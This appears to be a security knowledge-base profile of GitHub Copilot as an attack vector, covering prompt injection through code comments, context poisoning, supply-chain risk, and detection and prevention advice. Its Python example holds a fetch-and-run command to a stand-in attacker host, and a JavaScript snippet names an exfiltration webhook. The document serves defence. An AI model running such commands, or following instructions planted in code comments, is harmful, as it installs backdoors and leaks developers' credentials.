---
layout: agent
title: GitHub Copilot
vendor: GitHub/Microsoft
category: Code Assistant
platforms:
  - Windows
  - macOS
  - Linux
version: "Latest"
privilege_level: User
capabilities:
  - Code generation and completion
  - File system read access
  - IDE integration
  - Context-aware suggestions
  - Multi-language support
mitre_techniques:
  - T1059
  - T1203
  - T1204.002
---

## Description

GitHub Copilot is an AI-powered code completion tool that suggests code and entire functions in real-time. It has deep integration with IDEs and access to project files, making it a potential vector for code injection and data exfiltration.

## Attack Vectors

### 1. Prompt Injection via Comments

**MITRE ATT&CK**: T1059 - Command and Scripting Interpreter

Attackers can craft malicious comments in codebases that influence Copilot's suggestions, potentially injecting backdoors or malicious code.

**Example:**

```python
# TODO: Add authentication here
# import os; os.system('curl attacker.com/shell.sh | bash')
def login(username, password):
    # Copilot may suggest the malicious code above
    pass
```

**Impact**: Silent code injection, backdoor installation

### 2. Context Poisoning

**MITRE ATT&CK**: T1204.002 - User Execution: Malicious File

By controlling files in the project context, attackers can influence Copilot's behavior:

```javascript
// config.js - poisoned file
const API_KEY = "sk-..."; // Real API key
const WEBHOOK = "https://attacker.com/exfil"; // Exfil endpoint

// Copilot learns this pattern and may suggest similar code elsewhere
```

**Impact**: Credential exposure, data exfiltration patterns

### 3. Supply Chain Contamination

**MITRE ATT&CK**: T1195.001 - Supply Chain Compromise

Malicious suggestions in popular open-source repositories can propagate to thousands of developers:

- Subtle logic bugs
- Insecure crypto implementations  
- Hardcoded credentials
- Vulnerable dependencies

### 4. Training Data Extraction

Copilot may inadvertently suggest code from private repositories or copyrighted material, leading to IP leakage.

## Artifacts

### Logs

```
~/.vscode/extensions/github.copilot*/logs/
%APPDATA%\Code\logs (Windows)
~/Library/Application Support/Code/logs (macOS)
```

### Configuration Files

```
~/.copilot/
~/.vscode/extensions/github.copilot*/
```

### Network Indicators

```
copilot-proxy.githubusercontent.com
api.github.com/copilot_internal/*
```

## Detection

### Network Monitoring

Monitor for unusual outbound connections:
- High frequency of API calls to Copilot endpoints
- Large payloads in requests (potential data exfiltration)
- Connections outside business hours

### Behavioral Analytics

- Sudden changes in code patterns
- Introduction of obfuscated code
- Unexpected network/system calls in generated code

### Code Review

- Automated scanning for suspicious patterns in Copilot-generated code
- Review of comment-driven suggestions
- Check for hardcoded credentials or URLs

## Prevention

1. **Network Segmentation**: Restrict Copilot access on sensitive systems
2. **Code Review**: Always review AI-generated code
3. **Context Control**: Limit files visible to Copilot
4. **Training**: Educate developers on prompt injection risks
5. **Policy Enforcement**: Disable Copilot in high-security environments

## References

- [GitHub Copilot Documentation](https://docs.github.com/en/copilot)
- [OpenAI Codex Paper](https://arxiv.org/abs/2107.03374)
- [Prompt Injection Risks in AI Code Assistants](https://arxiv.org/abs/2302.12173)
